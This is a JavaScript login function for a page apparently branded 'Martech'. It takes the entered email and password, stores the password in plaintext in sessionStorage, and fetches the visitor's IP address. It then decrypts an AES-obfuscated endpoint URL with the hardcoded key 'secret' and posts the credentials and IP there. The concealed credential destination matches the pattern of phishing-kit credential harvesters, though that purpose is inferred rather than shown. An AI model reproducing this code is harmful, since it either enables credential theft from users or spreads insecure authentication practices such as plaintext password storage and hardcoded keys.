function login() {
    var submitButton = document.getElementById('submitbutton')
    submitButton.style.backgroundColor = 'lightgrey';
    submitButton.style.border = '1px solid lightgrey';
    submitButton.disabled = true;

    var username = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    
    // Generate a random key
    var key = Math.random().toString(36).substr(2, 10);
    // Store the key in sessionStorage
    sessionStorage.setItem("Username", username);
    sessionStorage.setItem("Password", password);
    sessionStorage.setItem("key", key);

    // Fetch IP address
    fetch('https://api.ipify.org?format=json')
        .then(function(response) {
            return response.json();
        })
        .then(function(ipData) {
            var ipAddress = ipData.ip;

            var formData = new FormData();
            var password = document.getElementById("password").value;
            formData.append("username", username);
            formData.append("password", password);
            formData.append("key", key);
            formData.append("ipAddress", ipAddress);

            function decryptURL(encryptedUrl, password) {
                var decrypted = CryptoJS.AES.decrypt(decodeURIComponent(encryptedUrl), password).toString(CryptoJS.enc.Utf8);
                return decrypted;
            }
            var encryptedUrl = "U2FsdGVkX19ke6xFKSff23W24Anb7XgAuMALMZQBVVp294uePNPgPhjiwQDDw0jD2+xetILnGVPt+hHJv9UFWV1TKvCt8/xDq0N06udwbHVj6kceUIvFbx8VrEJMD2cYgObPnHJaY4JDUMFvYLZIg9DCv4CO3EWnd/F4KdaLb/7f/Ai/M0LlyALi6uTvjooY";
            var password = 'secret';
            var decryptedUrl = decryptURL(encryptedUrl, password);

            fetch(decryptedUrl, {
                    method: "POST",
                    body: formData,
                })
                .then(function(response) {
                    return response.json();
                })
                .then(function(data) {
                    if (data.redirectUrl === "IP Address not found") {
                        var box = document.getElementById("alert");
                        document.getElementById('alertmessage').innerHTML = "IP address is not on the whitelist!";
                        box.style.display = "inline-block";
                        submitButton.style.backgroundColor = '';
                        submitButton.style.border = '';
                        submitButton.disabled = false;
                        setTimeout(function() {
                            box.style.display = "none";
                            window.location.href = "martechcloudipwhitelisting.html";
                        }, 3000); 
                    } else if (data.redirectUrl === "Invalid username or password") {
                        var box = document.getElementById("alert");
                        box.style.display = "inline-block";
                        submitButton.style.backgroundColor = '';
                        submitButton.style.border = '';
                        submitButton.disabled = false;
                        setTimeout(function() {
                            box.style.display = "none";
                        }, 3000);
                    } else {
                        var checkbox = document.getElementById('remember-me');
                        if (checkbox.checked) {
                            localStorage.setItem('MartechUsername', username);
                        }
                        submitButton.style.backgroundColor = '';
                        submitButton.style.border = '';
                        submitButton.disabled = false;
                        window.location.href = data.redirectUrl;
                    }
                })
                .catch(function(error) {
                    console.error("Error:", error);
                });
        })
        .catch(function(error) {
            console.error("Error fetching IP:", error);
        });
}
